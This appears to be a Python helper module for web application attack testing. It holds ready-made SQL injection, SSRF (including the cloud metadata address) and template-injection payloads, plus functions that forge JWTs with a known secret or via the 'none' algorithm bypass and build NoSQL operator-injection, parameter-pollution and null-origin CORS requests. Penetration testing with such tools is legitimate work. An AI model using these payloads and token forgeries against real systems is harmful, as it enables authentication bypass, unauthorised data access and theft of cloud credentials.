from __future__ import annotations

import base64
import hashlib
import hmac
import json
from urllib.parse import quote_plus, unquote_plus


REQUEST_TEMPLATES = {
    "sqli": ["' OR '1'='1", "' UNION SELECT NULL--", "admin' --"],
    "ssrf": ["http://127.0.0.1:80", "http://localhost/admin", "http://169.254.169.254/latest/meta-data/"],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
}


def url_encode(text: str) -> str:
    return quote_plus(text)


def url_decode(text: str) -> str:
    return unquote_plus(text)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def b64url_decode(text: str) -> bytes:
    pad = "=" * ((4 - len(text) % 4) % 4)
    return base64.urlsafe_b64decode(text + pad)


def jwt_decode_no_verify(token: str) -> dict[str, object]:
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("JWT must contain at least header.payload")

    try:
        header_text = b64url_decode(parts[0]).decode("utf-8", errors="ignore").strip()
        header = json.loads(header_text) if header_text else {}
    except json.JSONDecodeError as exc:
        raise ValueError("Invalid JWT header format") from exc
    try:
        payload_text = b64url_decode(parts[1]).decode("utf-8", errors="ignore").strip()
        payload = json.loads(payload_text) if payload_text else {}
    except json.JSONDecodeError as exc:
        raise ValueError("Invalid JWT payload format") from exc
    signature = parts[2] if len(parts) > 2 else ""
    return {
        "header": header,
        "payload": payload,
        "signature_b64url": signature,
    }


def jwt_forge_hs256(payload: dict[str, object], secret: str, header: dict[str, object] | None = None) -> str:
    """Forge an HMAC-SHA256 JWT using a known or recovered secret key."""
    if header is None:
        header = {"alg": "HS256", "typ": "JWT"}
    h_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{h_b64}.{p_b64}".encode("utf-8")
    sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    s_b64 = b64url_encode(sig)
    return f"{h_b64}.{p_b64}.{s_b64}"


def build_basic_auth(username: str, password: str) -> str:
    """Construct a standard HTTP Basic Authorization header value."""
    token = base64.b64encode(f"{username}:{password}".encode("utf-8")).decode("utf-8")
    return f"Basic {token}"


def parse_cookies(cookie_header: str) -> dict[str, str]:
    """Parse a Cookie header string into a dictionary."""
    cookies: dict[str, str] = {}
    if not cookie_header:
        return cookies
    for pair in cookie_header.split(";"):
        pair = pair.strip()
        if not pair:
            continue
        if "=" in pair:
            k, v = pair.split("=", 1)
            cookies[k.strip()] = v.strip()
        else:
            cookies[pair] = ""
    return cookies


def format_cookies(cookies: dict[str, str]) -> str:
    """Format a dictionary of cookie key-values into a Cookie header string."""
    return "; ".join(f"{k}={v}" for k, v in cookies.items())


def build_nosql_query_payload(field: str, operator: str = "$ne", value: object = "") -> dict[str, object]:
    """Build a MongoDB/NoSQL operator injection payload dictionary."""
    return {field: {operator: value}}


def jwt_forge_alg_none(payload: dict[str, object], header: dict[str, object] | None = None) -> str:
    """Forge an unverified JWT using the 'none' algorithm bypass."""
    if header is None:
        header = {"alg": "none", "typ": "JWT"}
    h_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    return f"{h_b64}.{p_b64}."


def build_graphql_query(field_name: str, subfields: list[str] | None = None) -> dict[str, str]:
    """Construct a GraphQL JSON query payload."""
    if subfields:
        fields_str = " ".join(subfields)
        query = f"query {{ {field_name} {{ {fields_str} }} }}"
    else:
        query = f"query {{ {field_name} }}"
    return {"query": query}


def build_ssti_probes() -> dict[str, str]:
    """Return common template injection mathematical evaluation probes."""
    return {
        "jinja2": "{{7*7}}",
        "twig": "{{7*7}}",
        "smarty": "{7*7}",
        "erb": "<%= 7*7 %>",
        "spring_el": "${7*7}",
    }


def merge_mass_assignment(
    base: dict[str, object],
    overrides: dict[str, object],
    allowed_keys: set[str] | None = None,
) -> dict[str, object]:
    """Simulate mass assignment with optional whitelist protection."""
    result = dict(base)
    for k, v in overrides.items():
        if allowed_keys is None or k in allowed_keys:
            result[k] = v
    return result


def build_http_parameter_pollution_query(params: list[tuple[str, str]]) -> str:
    """Build an HTTP Parameter Pollution query string preserving duplicate keys."""
    return "&".join(f"{quote_plus(k)}={quote_plus(v)}" for k, v in params)


def parse_swagger_spec(spec: dict[str, object]) -> list[str]:
    """Extract route paths defined in an OpenAPI / Swagger document."""
    paths = spec.get("paths", {})
    if isinstance(paths, dict):
        return list(paths.keys())
    return []


def build_jsonp_callback_url(base_url: str, callback: str = "handleResponse") -> str:
    """Construct a JSONP endpoint URL appending callback parameter."""
    sep = "&" if "?" in base_url else "?"
    return f"{base_url}{sep}callback={quote_plus(callback)}"


def build_cors_null_origin_headers() -> dict[str, str]:
    """Return request headers testing null-origin CORS trust misconfiguration."""
    return {"Origin": "null"}


